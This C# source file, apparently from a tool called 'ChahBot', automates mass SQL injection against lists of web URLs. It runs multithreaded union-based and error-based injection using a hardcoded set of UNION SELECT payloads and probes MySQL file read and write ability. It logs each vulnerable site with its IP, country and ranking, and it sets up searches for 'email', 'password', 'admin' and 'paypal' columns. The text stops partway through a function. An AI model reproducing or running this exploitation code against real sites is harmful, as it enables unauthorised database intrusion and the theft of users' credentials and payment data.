using DataBase;
using HtmlAgilityPack;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ChahBot_1_0_Gacy.Controller
{
    class InjecterUrls
    {
        private class ThreadAnalizer
        {
            private int __ID;

            private Thread __Thread;

            private string __URL;

            private Types __Method;

            private int __Threads;

            public Thread Thread
            {
                get
                {
                    return this.__Thread;
                }
                set
                {
                    this.__Thread = value;
                }
            }

            public int ID
            {
                get
                {
                    return this.__ID;
                }
                set
                {
                    this.__ID = value;
                }
            }

            public Types Method
            {
                get
                {
                    return this.__Method;
                }
                set
                {
                    this.__Method = value;
                }
            }

            public string URL
            {
                get
                {
                    return this.__URL;
                }
                set
                {
                    this.__URL = value;
                }
            }

            public int Threads
            {
                get
                {
                    return this.__Threads;
                }
                set
                {
                    this.__Threads = value;
                }
            }

            public ThreadAnalizer(int id)
            {
                this.__ID = id;
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct atAnalizer
        {
            public dynamic Order;
            public int TimeOut;
            public int Delay;
            public int Retry;
            public List<stAnalizerUrl> Urls;
            public bool StringColumn;
            public byte Threads;
            public int StartFrom;
            public int MaxUnion;
            public bool ServerInfo;
            public stCheckColumns CheckColumns;
            public bool IsReCheck;
            public bool IsRecheckOnlyColumns;
            public List<string> UnionStyle;
            public bool MySQLLoadFile;
            public bool MySQLWriteFile;
            public bool MagicQuotes;
            public enInjectableType Archive;
            public bool ErrorBasead;
            public bool UnionBasead;
            public bool UnionInteger;
            public bool UnionKeyword;
            public bool IntensiveCheck;
            public bool MySQLErrorUnion;
            public bool MSSQLErrorUnion;
            public bool AlexaRank;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct stCheckColumns
        {
            public string Column1;
            public string Column2;
            public string Column3;
            public string Column4;
            public bool All1;
            public bool All2;
            public bool All3;
            public bool All4;
            public bool CurrentDB;
            public CheckSearchType SearchType;
        }
        private struct stSearchSummary
        {
            public int Added;
            public int InExploitable;
            public int InInjectableDomain;
            public int InInTrash;
            public int NonInjectable;
            public int Unsupported;
            public int Found;

            public int Loaded()
            {
                return checked(this.Added + this.InExploitable + this.InInjectableDomain + this.InInTrash + this.NonInjectable + this.Unsupported);
            }
        }
        private struct stAnalizerUrl
        {
            public string Url;
            public Types Method;
        }
        private enum CheckSearchType
        {
            Columns,
            Tables
        }
        private enum enInjectableType : byte
        {
            Archived = 1,
            UnArchived = 0
        }

        private struct stExploitable
        {
            public string url;
            public string sql_type;
            public string ip;
            public string country;
            public string country_code;
        }
        
        static List<stAnalizerUrl> Urls = new List<stAnalizerUrl>();
        private atAnalizer __Analizer;
        private ThreadPool __ThreadPoolAnalizer;
        private static bool __RunningWorker = false;
        public Hashtable __EXPLOITABLES__ = new Hashtable();
        public Hashtable __INJECATBLES__ = new Hashtable();
        public Hashtable __NON_INJECATBLES__ = new Hashtable();

        private stSearchSummary __SearchSummary;
        private long ExploiterCheckRequestDelay_LastTick;
        private long ScannerExploitCheckDelay_LastTick;
        private Dictionary<string, List<string>> AnalizerCheckColumn_cDBS;
        private StaticLocalInitFlag AnalizerCheckColumn_cDBS_Init;
        private Dictionary<string, List<string>> AnalizerCheckTable_cDBS;
        private StaticLocalInitFlag AnalizerCheckTable_cDBS_Init;

        BackgroundWorker bckAnalizer;

        public InjecterUrls()
        {
            __EXPLOITABLES__ = new Hashtable();
            bckAnalizer = new BackgroundWorker();
            bckAnalizer.DoWork += new DoWorkEventHandler(bckAnalizer_DoWork);
            bckAnalizer.ProgressChanged += new ProgressChangedEventHandler(bckAnalizer_ProgressChanged);
            bckAnalizer.RunWorkerCompleted += new RunWorkerCompletedEventHandler(bckAnalizer_RunWorkerCompleted);
            bckAnalizer.WorkerReportsProgress = true;
            bckAnalizer.WorkerSupportsCancellation = true;
        }

        public void StartWorker(dynamic order, Hashtable Exploitables, int TimeOut = 15000, int numHttpDelay = 100, int nbrThread = 1)
        {
            __EXPLOITABLES__ = Exploitables;
            if (__RunningWorker)
            {
                return;
            }
            checked
            {
                List<stAnalizerUrl> list2 = new List<stAnalizerUrl>();
                __Analizer = default(atAnalizer);
                __Analizer.Order = order;
                Globals.UpDateStatus(__Analizer.Order, "Injecter", "Scanner thread, loading please wait..");

                if (true)
                {
                    if (Exploitables.Values.Count == 0)
                    {
                        Globals.UpDateStatus(__Analizer.Order, "Injecter", "Analizer thread, no available URL's to analize.");
                        Interaction.Beep();
                        return;
                    }
                    try
                    {
                        foreach (dynamic dObj in __EXPLOITABLES__.Values)
                        {
                            stAnalizerUrl item = default(stAnalizerUrl);
                            item.Url = Convert.ToString(dObj.url);
                            item.Method = Utls.StringToType(dObj.sql_type);
                            if (!list2.Contains(item))
                            {
                                list2.Add(item);
                            }
                        }
                    }
                    finally
                    {
                        IEnumerator enumerator3 = null;
                        if (enumerator3 is IDisposable)
                        {
                            (enumerator3 as IDisposable).Dispose();
                        }
                    }
                    if (list2.Count == 0)
                    {
                        Globals.UpDateStatus(__Analizer.Order, "Injecter", "Get Server Info thread, no URL seleted.");
                        Interaction.Beep();
                        return;
                    }
                }
                bool flag = false; //Verfier si liste des colonne est present
                this.__Analizer.Retry = 3;
                this.__Analizer.StringColumn = true;
                this.__Analizer.Threads = Convert.ToByte(nbrThread);
                this.__Analizer.TimeOut = Convert.ToInt32(TimeOut);
                this.__Analizer.Delay = Convert.ToInt32(numHttpDelay);
                this.__Analizer.Urls = list2;

                this.__Analizer.StartFrom = Convert.ToInt32(1);
                this.__Analizer.MaxUnion = Convert.ToInt32(60);
               
                this.__Analizer.ServerInfo = flag;
                this.__Analizer.IntensiveCheck = true;//Genere plus de requete

                if (flag)
                {
                    this.__Analizer.CheckColumns = default(stCheckColumns);
                    this.__Analizer.CheckColumns.Column1 = "email";
                    this.__Analizer.CheckColumns.Column2 = "password";
                    this.__Analizer.CheckColumns.Column3 = "admin";
                    this.__Analizer.CheckColumns.Column4 = "paypal";
                    this.__Analizer.CheckColumns.All1 = false;
                    this.__Analizer.CheckColumns.All2 = false;
                    this.__Analizer.CheckColumns.All3 = false;
                    this.__Analizer.CheckColumns.All4 = false;
                    this.__Analizer.CheckColumns.CurrentDB = false;
                    this.__Analizer.IsRecheckOnlyColumns = false;
                    this.__Analizer.CheckColumns.SearchType = (CheckSearchType)Conversions.ToInteger(Interaction.IIf(0 == 0, CheckSearchType.Columns, CheckSearchType.Tables));
                }

                this.__Analizer.IsReCheck = false;
                this.__Analizer.MySQLLoadFile = true;
                this.__Analizer.MySQLWriteFile = true;
                this.__Analizer.MagicQuotes = true;
                
                List<string> unionAnalyser = new List<string>()
                {
                    "999999.9 union all select [t]",
                    "999999.9' union all select [t] and '0'='0",
                    "999999.9 union all select [t]--",
                    "999999.9\" union all select [t] and \"0\"=\"0--",
                    "999999.9\" union all select [t] and \"0\"=\"0",
                    "999999.9) union all select [t] and (0=0",
                    "999999.9 union all select [t] #",
                    "999999.9' union all select [t] and '0'='0 #",
                    "999999.9') union all select [t] and ('0'='0",
                    "' union all select [t] and '0'='0--",
                    "union all select [t]--",
                    "' union all select [t] and '0'='0--",
                    ") union all select [t]",
                    "') union all select [t] and ('0'='0",
                    ") union all select [t]--",
                    "') union all select [t] and ('0'='0--",
                    "union all select [t] from dual",
                    "' union all select [t] from dual--",
                };
                this.__Analizer.UnionStyle = unionAnalyser;

                this.__Analizer.ErrorBasead = true;
                this.__Analizer.UnionBasead = true;
                this.__Analizer.UnionInteger = true;
                this.__Analizer.UnionKeyword = true;
                this.__Analizer.AlexaRank = true;
                this.__Analizer.MySQLErrorUnion = true;
                this.__Analizer.MSSQLErrorUnion = false;
                if (!this.__Analizer.ErrorBasead & !this.__Analizer.UnionBasead)
                {
                    Globals.UpDateStatus(__Analizer.Order, "Injecter", "Analizer thread, Union and Error basead un-checked!");
                    Interaction.Beep();
                    return;
                }
                if (list2.Count == 0)
                {
                    Globals.UpDateStatus(__Analizer.Order, "Injecter", "Analizer thread, the URL's is not compatible with the parameters to analize.");
                    Interaction.Beep();
                    return;
                }
                Thread th = new Thread(() =>
                {
                    bckAnalizer.RunWorkerAsync(this.__Analizer);
                });
                th.Priority = ThreadPriority.Highest;
                th.IsBackground = true;
                th.Start();

                goto IL_FD3;

                Interaction.Beep();
                return;
            IL_FD3:
                this.__SearchSummary = default(stSearchSummary);
            }
        }

        private void bckAnalizer_DoWork(object sender, DoWorkEventArgs e)
        {
	        checked
	        {
                __RunningWorker = true;
                int num = 0;
                int num2 = 0;
		        try
		        {
                    
			        if (this.__Analizer.Urls.Count > (int)this.__Analizer.Threads)
			        {
				        num = (int)this.__Analizer.Threads;
			        }
			        else
			        {
				        num = this.__Analizer.Urls.Count;
			        }
			        __ThreadPoolAnalizer = new ThreadPool(num);
			        try
			        {
				        List<stAnalizerUrl>.Enumerator enumerator = this.__Analizer.Urls.GetEnumerator();
				        while (enumerator.MoveNext())
				        {
					        stAnalizerUrl current = enumerator.Current;
					        if (bckAnalizer.CancellationPending)
					        {
						        __ThreadPoolAnalizer.AbortThreads();
						        break;
					        }
					        if (__ThreadPoolAnalizer.Status == ThreadPool.ThreadStatus.Stopped)
					        {
						        break;
					        }
					        int percentProgress = (int)Math.Round(Math.Round((double)(100 * (num2 + 1)) / (double)this.__Analizer.Urls.Count));
					        if (num > 1)
					        {
						        Globals.UpDateStatus(__Analizer.Order, "Injecter", string.Concat(new string[]
						        {
							        "[",
							            Conversions.ToString(num2 + 1),
							            "/",
							            Conversions.ToString(this.__Analizer.Urls.Count),
							        "] Analizer thread, injectable detected: ",
							        Conversions.ToString(__SearchSummary.Found)
						        }));
					        }
					        bckAnalizer.ReportProgress(percentProgress, "");
                        IL_171:
                            try
					        {
						        Thread thread = new Thread(delegate(object a0)
						        {
							        AnalizerTryExploite((ThreadAnalizer)a0);
						        });
						        thread.IsBackground = true;
						        thread.Name = "Pos : " + num2.ToString();
						        thread.Start(new ThreadAnalizer(num2)
						        {
							        Thread = thread,
							        URL = current.Url,
							        Method = current.Method,
							        Threads = num
						        });
						        __ThreadPoolAnalizer.Open(thread);
					        }
					        catch (Exception expr_1F2)
					        {
						        ProjectData.SetProjectError(expr_1F2);
						        Thread.Sleep(1000);
						        __ThreadPoolAnalizer.WaitForThreads();
						        ProjectData.ClearProjectError();
						        goto IL_171;
					        }
					        __ThreadPoolAnalizer.WaitForThreads();
					        num2++;
                            Thread.Sleep(this.__Analizer.Delay);
                            Thread.Sleep(2000);
				        }
			        }
			        finally
			        {
				        List<stAnalizerUrl>.Enumerator enumerator = new List<stAnalizerUrl>.Enumerator();
				        ((IDisposable)enumerator).Dispose();
			        }
                 }
                 catch (Exception expr_26A)
                 {
                     ProjectData.SetProjectError(expr_26A);
                     ProjectData.ClearProjectError();
                 }
                 finally
                 {
                     __ThreadPoolAnalizer.AllJobsPushed();
                     while (true)
                     {
                         bckAnalizer.ReportProgress(100, "");
                         if (bckAnalizer.CancellationPending)
                         {
                             __ThreadPoolAnalizer.AbortThreads();
                         }
                         if (__ThreadPoolAnalizer.Finished)
                         {
                             break;
                         }
                         if (this.__Analizer.IsReCheck)
                         {
                             if (num == 1)
                             {
                                 Globals.UpDateStatus(__Analizer.Order, "Injecter", string.Concat(new string[]
                                 {
                                     "[",
                                     Conversions.ToString(__Analizer.Urls.Count),
                                     "/",
                                     Conversions.ToString(this.__Analizer.Urls.Count),
                                     "] Analizer thread, finishing thread, injectable detected: ",
                                     Conversions.ToString(__SearchSummary.Found)
                                 }));
                             }
                             else
                             {
                                 Globals.UpDateStatus(__Analizer.Order, "Injecter", string.Concat(new string[]
                                 {
                                     "[",
                                     Conversions.ToString(this.__Analizer.Urls.Count),
                                     "/",
                                     Conversions.ToString(this.__Analizer.Urls.Count),
                                     "] Analizer thread, finishing threads.. [",
                                     Conversions.ToString(__ThreadPoolAnalizer.ThreadCount),
                                     "], injectable detected: ",
                                     Conversions.ToString(__SearchSummary.Found)
                                 }));
                             }
                         }
                         else if (num == 1)
                         {
                             Globals.GUI.sendInjectables(__Analizer.Order, __INJECATBLES__);
                             Globals.UpDateStatus(__Analizer.Order, "Injecter", string.Concat(new string[]
                             {
                                 "[",
                                 Conversions.ToString(this.__Analizer.Urls.Count),
                                 "/",
                                 Conversions.ToString(this.__Analizer.Urls.Count),
                                 "] Analizer thread, finishing thread, injectable detected: ",
                                 Conversions.ToString(this.__SearchSummary.Added)
                             }));
                         }
                         else
                         {
                             Globals.UpDateStatus(__Analizer.Order, "Injecter", string.Concat(new string[]
                             {
                                 "[",
                                 Conversions.ToString(this.__Analizer.Urls.Count),
                                 "/",
                                 Conversions.ToString(this.__Analizer.Urls.Count),
                                 "] Analizer thread, finishing threads.. [",
                                 Conversions.ToString(__ThreadPoolAnalizer.ThreadCount),
                                 "] injectable detected:  ",
                                 Conversions.ToString(this.__SearchSummary.Added)
                             }));
                         }
                         
                         Thread.Sleep(200);
                     }
                 }
            }
            Thread.Sleep(5000);
        }

        private void bckAnalizer_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            int num2 = 0;
            /*try
            {*/
                bool flag = false;
                int num3 = 0;
            Label_0000:
                ProjectData.ClearProjectError();
                int num = 1;
            Label_0007:
                num3 = 2;
            Globals.GUI.setProgress(__Analizer.Order, e.ProgressPercentage);
            Console.WriteLine(e.ProgressPercentage + "% " + e.UserState.ToString());
                //Globals.UpDateLoading(ref this.__Loading, e.ProgressPercentage, ref flag, e.UserState.ToString());
            Label_0027:
                num3 = 3;
                if (!(flag | !Globals.NETWORK_AVAILABLE))
                {
                    goto Label_00A5;
                }
            Label_0035:
                num3 = 4;
                this.bckAnalizer.CancelAsync();
                goto Label_00A5;
            Label_0044:
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0000;

                    case 2:
                        goto Label_0007;

                    case 3:
                        goto Label_0027;

                    case 4:
                        goto Label_0035;

                    case 5:
                        goto Label_00A5;

                    default:
                        goto Label_009A;
                }
            Label_0068:
                num2 = num3;
                switch (num)
                {
                    case 0:
                        goto Label_009A;

                    case 1:
                        goto Label_0044;
                }
           /* }
            catch (Exception exception1)// when (?)
            {
                ProjectData.SetProjectError(exception1);
                //goto Label_0068;
            }*/
        Label_009A:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_00A5:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }

	    private void bckAnalizer_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	    {
            __RunningWorker = false;

            Globals.UpDateStatus(__Analizer.Order, "Injecter", "Analizer thread done, injectable detected: " + this.GetInjectableSummary());
            Globals.GUI.sendInjectables(__Analizer.Order, __INJECATBLES__);
	    }

        private string GetInjectableSummary()
        {
            if ((this.__SearchSummary.InInjectableDomain | this.__SearchSummary.InInTrash) != 0)
            {
                return string.Concat(new object[]
			    {
				    "URL's Found In(",
				    RuntimeHelpers.GetObjectValue(Interaction.IIf(this.__SearchSummary.InInjectableDomain != 0, " Injectable Domain:" + Strings.FormatNumber(this.__SearchSummary.InInjectableDomain, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault), "")),
				    RuntimeHelpers.GetObjectValue(Interaction.IIf(this.__SearchSummary.InInTrash != 0, " Trash:" + Strings.FormatNumber(this.__SearchSummary.InInTrash, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault), "")),
				    RuntimeHelpers.GetObjectValue(Interaction.IIf(this.__Analizer.IsReCheck, ") Checked:", ") Found:")),
				    Strings.FormatNumber(this.__SearchSummary.Found, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault)
			    }).Replace("( ", "(");
            }
            return RuntimeHelpers.GetObjectValue(Interaction.IIf(this.__Analizer.IsReCheck, "Checked:", "Found:")) + Strings.FormatNumber(this.__SearchSummary.Found, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault);
        }
	    private bool AnalizerCheckForCancel()
	    {
		    this.bckAnalizer.ReportProgress(-1, "");
		    if (this.bckAnalizer.CancellationPending)
		    {
			    return true;
		    }
		    /*while (this.__Loading.Paused)
		    {
			    Thread.Sleep(200);
		    }*/
		    bool result = false;
		    return result;
	    }

        private void AnalizerTryExploite(ThreadAnalizer t)
        {
            /*try
            {*/
                Analizer analizer;
                Analizer analizer2;
                if ((!this.__Analizer.IsReCheck & !this.__Analizer.IsRecheckOnlyColumns) && __INJECATBLES__.ContainsKey(t.URL))
                {
                    //this.urlExploitables.Remove(t.URL);
                    this.__SearchSummary.InInjectableDomain++;
                }
                else
                {
                    int num = 0;
                    bool flag = true;
                    if (true == (__ThreadPoolAnalizer.MaxThreadCount == 1))
                    {
                        num = 2;
                    }
                    else if (flag == (__ThreadPoolAnalizer.MaxThreadCount <= 5))
                    {
                        num = 4;
                    }
                    else if (flag == (__ThreadPoolAnalizer.MaxThreadCount <= 10))
                    {
                        num = 3;
                    }
                    else if (flag == (__ThreadPoolAnalizer.MaxThreadCount <= 20))
                    {
                        num = 2;
                    }
                    else if (flag == (__ThreadPoolAnalizer.MaxThreadCount <= 30))
                    {
                        num = 1;
                    }
                    analizer = new Analizer(num, this.__Analizer.TimeOut, this.__Analizer.Delay, this.__Analizer.Retry, !this.__Analizer.IntensiveCheck);
                    analizer.OnCompleteEvent += new Analizer.OnCompleteEventHandler(this.Analizer_OnComplete);
                    if (t.Threads == 1)
                    {
                        analizer.OnProgressEvent += new Analizer.OnProgressEventHandler(this.Analizer_OnProgress);
                    }
                    analizer.Tag = t;
                    analizer.SQLType = t.Method;
                    if (true == this.__Analizer.IsRecheckOnlyColumns)
                    {
                        string[] sColummCheck = new string[4];
                        string sVersion = "";
                        if (Utls.TypeIsMySQL(t.Method) | Utls.TypeIsMSSQL(t.Method))
                        {
                            string sUser = "";
                            if (analizer.CheckServerInfo(t.URL, ref sVersion, ref sUser, true) && ((!sVersion.StartsWith("4") & Utls.TypeIsMySQL(t.Method)) | !Utls.TypeIsMySQL(t.Method)))
                            {
                                if (this.__Analizer.CheckColumns.SearchType == CheckSearchType.Columns)
                                {
                                    if (!string.IsNullOrEmpty(this.__Analizer.CheckColumns.Column1))
                                    {
                                        sColummCheck[0] = this.AnalizerCheckColumn(t, t.Method, t.URL, this.__Analizer.CheckColumns.Column1, this.__Analizer.CheckColumns.All1, analizer.MySQLCollactions, analizer.MSSQLCollate);
                                    }
                                    if (!string.IsNullOrEmpty(this.__Analizer.CheckColumns.Column2))
                                    {
                                        sColummCheck[1] = this.AnalizerCheckColumn(t, t.Method, t.URL, this.__Analizer.CheckColumns.Column2, this.__Analizer.CheckColumns.All2, analizer.MySQLCollactions, analizer.MSSQLCollate);
                                    }
                                    if (!string.IsNullOrEmpty(this.__Analizer.CheckColumns.Column3))
                                    {
                                        sColummCheck[2] = this.AnalizerCheckColumn(t, t.Method, t.URL, this.__Analizer.CheckColumns.Column3, this.__Analizer.CheckColumns.All3, analizer.MySQLCollactions, analizer.MSSQLCollate);
                                    }
                                    if (!string.IsNullOrEmpty(this.__Analizer.CheckColumns.Column4))
                                    {
                                        sColummCheck[3] = this.AnalizerCheckColumn(t, t.Method, t.URL, this.__Analizer.CheckColumns.Column4, this.__Analizer.CheckColumns.All4, analizer.MySQLCollactions, analizer.MSSQLCollate);
                                    }
                                }
                                else if (this.__Analizer.CheckColumns.SearchType == CheckSearchType.Tables)
                                {
                                    if (!string.IsNullOrEmpty(this.__Analizer.CheckColumns.Column1))
                                    {
                                        sColummCheck[0] = this.AnalizerCheckTable(t, t.Method, t.URL, this.__Analizer.CheckColumns.Column1, this.__Analizer.CheckColumns.All1, analizer.MySQLCollactions, analizer.MSSQLCollate);
                                    }
                                    if (!string.IsNullOrEmpty(this.__Analizer.CheckColumns.Column2))
                                    {
                                        sColummCheck[1] = this.AnalizerCheckTable(t, t.Method, t.URL, this.__Analizer.CheckColumns.Column2, this.__Analizer.CheckColumns.All2, analizer.MySQLCollactions, analizer.MSSQLCollate);
                                    }
                                    if (!string.IsNullOrEmpty(this.__Analizer.CheckColumns.Column3))
                                    {
                                        sColummCheck[2] = this.AnalizerCheckTable(t, t.Method, t.URL, this.__Analizer.CheckColumns.Column3, this.__Analizer.CheckColumns.All3, analizer.MySQLCollactions, analizer.MSSQLCollate);
                                    }
                                    if (!string.IsNullOrEmpty(this.__Analizer.CheckColumns.Column4))
                                    {
                                        sColummCheck[3] = this.AnalizerCheckTable(t, t.Method, t.URL, this.__Analizer.CheckColumns.Column4, this.__Analizer.CheckColumns.All4, analizer.MySQLCollactions, analizer.MSSQLCollate);
                                    }
                                }
                               // this.AnalizerUpDateGrid(t.URL, t.URL, Utls.TypeToString(analizer.SQLType), "", sVersion, "", "", analizer.WebServer, sColummCheck, "");
                                this.__SearchSummary.Found++;
                            }
                        }
                    }
                    else if (this.__Analizer.IsReCheck && t.URL.Contains("[t]"))
                    {
                        string str4 = "";
                        string str3 = "";
                        string sAlexa = "";
                        if (!Utls.TypeIsError(t.Method))
                        {
                        }
                        if (analizer.CheckServerInfo(t.URL, ref str4, ref str3, false))
                        {
                            string sHighlights = "";
                            sHighlights = this.AnalizerGetHighlights(t.URL, analizer);
                            if (this.__Analizer.AlexaRank)
                            {
                                sAlexa = this.AnalizerAlexaRank(t.URL);
                            }
                            //this.AnalizerUpDateGrid(t.URL, t.URL, Utls.TypeToString(analizer.SQLType), sHighlights, str4, str3, sAlexa, analizer.WebServer, null, "");
                            this.__SearchSummary.Found++;
                        }
                    }
                    else
                    {
                        analizer.Start(Analizer.InjectionPoint.URL, enHTTPMethod.POST, t.URL, ref this.__Analizer.UnionStyle, this.__Analizer.StartFrom, this.__Analizer.MaxUnion, "", "", "", "", this.__Analizer.ErrorBasead, this.__Analizer.UnionInteger, this.__Analizer.UnionKeyword, this.__Analizer.MySQLErrorUnion, this.__Analizer.MSSQLErrorUnion, Types.Unknown);
                        while (analizer.Running)
                        {
                            /* if (this.__Loading.Canceling | !this.__RunningWorker)
                             {
                                 goto Label_06C1;
                             }
                             analizer.Paused(this.__Loading.Paused);*/
                            Thread.Sleep(200);
                        }
                    }
                }
                return;
            Label_06C1:
                analizer2 = analizer;
                lock (analizer2)
                {
                    analizer.Cancel();
                }
            /*}
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            finally
            {*/
                /*try
                {*/
                    __ThreadPoolAnalizer.Close(t.Thread);
                /*}
                catch (Exception exception3)
                {
                    ProjectData.SetProjectError(exception3);
                    ProjectData.ClearProjectError();
                }*/
           /* }*/
        }

	    private string AnalizerGetHighlights(string sURL, Analizer oAnalizer)
	    {
		    string text = "";
		    if (this.__Analizer.MySQLLoadFile & oAnalizer.SQLType == Types.MySQL_No_Error)
		    {
			    string text2 = "";
			    string text3 = "";
			    if (oAnalizer.CheckLoadFileMySQL(sURL, ref text2))
			    {
				    if (this.__Analizer.MySQLWriteFile)
				    {
					    if (oAnalizer.CheckMagicQuotes(sURL))
					    {
						    if (oAnalizer.CheckWriteMySQL(sURL, !text2.Contains(":"), ref text3, true))
						    {
						    }
					    }
					    else
					    {
						    text3 = "";
					    }
				    }
			    }
			    else
			    {
				    text2 = "";
			    }
			    if (!(string.IsNullOrEmpty(text2) & string.IsNullOrEmpty(text3)))
			    {
				    if (!string.IsNullOrEmpty(text3))
				    {
					    text = "Write:" + text3 + " ";
				    }
				    if (!string.IsNullOrEmpty(text2))
				    {
					    text = text + "Load:" + text2 + " ";
				    }
			    }
		    }
		    return text;
	    }

	    private void Analizer_OnComplete(Analizer o)
	    {
			if (o.Result != InjectionType.None)
			{
                string sUser = "";
				string sVersion = "";
                string sHighlights = "";
                string sAlexaRank = "";

				string webServer = o.WebServer;
				if (o.CheckServerInfo(o.InjectQuery, ref sVersion, ref sUser, false))
				{
                    sHighlights = this.AnalizerGetHighlights(o.InjectQuery, o);
				}
				if (this.__Analizer.AlexaRank)
				{
					sAlexaRank = this.AnalizerAlexaRank(o.URL);
				}
				else
				{
					AddURL(o.URL, new string[]
					{
						o.InjectQuery,
						Utls.TypeToString(o.SQLType),
						sHighlights,
						sVersion,
						sUser,
						sAlexaRank,
						webServer,
						"",
						"",
						"",
						"",
						""
					});
				}
				this.__SearchSummary.Found = checked(this.__SearchSummary.Found + 1);
            }
            else
            {
                __NON_INJECATBLES__.Add(o.URL, o.URL);
            }
	    }
        private void AddURL(string sURL, params string[] sValues)
        {
            ProjectData.ClearProjectError();

            if (!__INJECATBLES__.ContainsKey(sURL))
            {
                this.__SearchSummary.InExploitable++;

                string sCountry = string.Empty;
                string sCountryCode = string.Empty;
                string sIP = string.Empty;
                string sTitle = string.Empty;
                string sDescription = string.Empty;

                CheckGeoIP(sURL, ref sIP, ref sCountry, ref sCountryCode);
                getSiteTiltle(sURL, ref sTitle, ref sDescription);

                Dictionary<string, string> list = new Dictionary<string, string>();
                list.Add("url", sURL);
                list.Add("urlPoint", sValues[0]);
                list.Add("sqlType", sValues[1]);
                list.Add("highlights", sValues[2]);
                list.Add("version", sValues[3]);
                list.Add("user", sValues[4]);
                list.Add("alexaRanking", sValues[5]);
                list.Add("webServer", sValues[6]);
                list.Add("ip", sIP);
                list.Add("country", sCountry);
                list.Add("countryCode", sCountryCode);
                list.Add("title", sTitle);
                list.Add("description", sDescription);

                __INJECATBLES__.Add(sURL, list);
                this.__SearchSummary.Added++;
            }
        }

        private void getSiteTiltle(string sURL, ref string sTitle, ref string sDescription)
        {
            sTitle = "N/A";
            sDescription = "";
            string source = "";
            try
            {
                var uri = new Uri(sURL);
                string baseURL = uri.Authority;
                HTTP http = new HTTP(15000, true);
                string sPostData = "";
                string sErrorStr = "";
                source = http.GetHTML(sURL, enHTTPMethod.GET, ref sPostData, null, null, false, ref sErrorStr);
            }
            catch
            {
            }
            if (!string.IsNullOrEmpty(source))
            {
                HtmlAgilityPack.HtmlDocument doc = new HtmlAgilityPack.HtmlDocument();
                doc.LoadHtml(source);
                try
                {
                    //  title = Regex.Match(source, @"\<title\b[^>]*\>\s*(?<Title>[\s\S]*?)\</title\>", RegexOptions.IgnoreCase).Groups["Title"].Value;
                    sTitle = doc.DocumentNode.Descendants("title").SingleOrDefault().InnerText;
                }
                catch
                {
                }
                try
                {

                    HtmlNode mdnode = doc.DocumentNode.SelectSingleNode("//meta[@name='description']");
                    if (mdnode != null)
                    {
                        HtmlAttribute desc;
                        desc = mdnode.Attributes["content"];
                        sDescription = desc.Value;
                        Console.Write("DESCRIPTION: " + sDescription);
                    }
                    if (string.IsNullOrEmpty(sDescription))
                    {
                        mdnode = doc.DocumentNode.SelectSingleNode("//meta[@name='keywords']");
                        if (mdnode != null)
                        {
                            HtmlAttribute desc;
                            desc = mdnode.Attributes["content"];
                            sDescription = desc.Value;
                            Console.Write("DESCRIPTION: " + sDescription);
                        }
                    }
                }
                catch
                {
                }
            }
        }
        private void CheckGeoIP(string sURL, ref string sIP, ref string sCountry, ref string sCountryCode)
        {
            string domainCode;
            Utilities utilities = Globals.G_Utilities;
            lock (utilities)
            {
                sIP = Globals.G_Utilities.UrlToIP(sURL);
                domainCode = Globals.G_Utilities.GetDomainCode(sURL);
            }
            GeoIP oip = Globals.G_GEOIP;
            lock (oip)
            {
                if (Globals.G_GEOIP.CountryCodeExist(domainCode))
                {
                    sCountry = Globals.G_GEOIP.CountryNameByCode(domainCode);
                    sCountryCode = Globals.G_GEOIP.LookupCountryCode(sIP);
                }
                else
                {
                    sCountry = Globals.G_GEOIP.LookupCountry(sIP);
                    sCountryCode = Globals.G_GEOIP.LookupCountryCode(sIP);
                }
            }
        }

        private void Analizer_OnProgress(string sDesc, int iPerc, Analizer sender)
        {
            int num2 = 0;
           /* try
            {*/
                int num3;
            Label_0000:
                ProjectData.ClearProjectError();
                int num = 1;
            Label_0007:
                num3 = 2;
                this.bckAnalizer.ReportProgress(iPerc, sDesc);
                goto Label_0071;
            Label_0018:
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0000;

                    case 2:
                        goto Label_0007;

                    case 3:
                        goto Label_0071;

                    default:
                        goto Label_0066;
                }
            Label_0034:
                num2 = num3;
                switch (num)
                {
                    case 0:
                        goto Label_0066;

                    case 1:
                        goto Label_0018;
                }
            /*}
            catch (Exception exception1)// when (?)
            {
                ProjectData.SetProjectError(exception1);
                //goto Label_0034;
            }*/
        Label_0066:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_0071:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }

	    private string AnalizerCheckColumn(ThreadAnalizer t, Types oType, string sBuilUrl, string sColumn, bool bAllResults, MySQLCollactions oMySQLCollation, bool bMSSQLCollateLatin)
	    {
		    string text = "";
		    List<string> list = new List<string>();
		    List<string> list2 = new List<string>();
		    bool flag = false;
		   /* try
		    {*/
			    Monitor.Enter(this.AnalizerCheckColumn_cDBS_Init, ref flag);
			    if (this.AnalizerCheckColumn_cDBS_Init.State == 0)
			    {
				    this.AnalizerCheckColumn_cDBS_Init.State = 2;
				    this.AnalizerCheckColumn_cDBS = new Dictionary<string, List<string>>();
			    }
			    else if (this.AnalizerCheckColumn_cDBS_Init.State == 2)
			    {
				    throw new IncompleteInitialization();
			    }
		    /*}
		    finally
		    {
			    this.AnalizerCheckColumn_cDBS_Init.State = 1;
			    if (flag)
			    {
				    Monitor.Exit(this.AnalizerCheckColumn_cDBS_Init);
			    }
		    }*/
		    checked
		    {
			   /* try
			    {*/
				    if (this.AnalizerCheckColumn_cDBS.ContainsKey(sBuilUrl))
				    {
					    list2 = this.AnalizerCheckColumn_cDBS[sBuilUrl];
				    }
				    long num3 = 0;
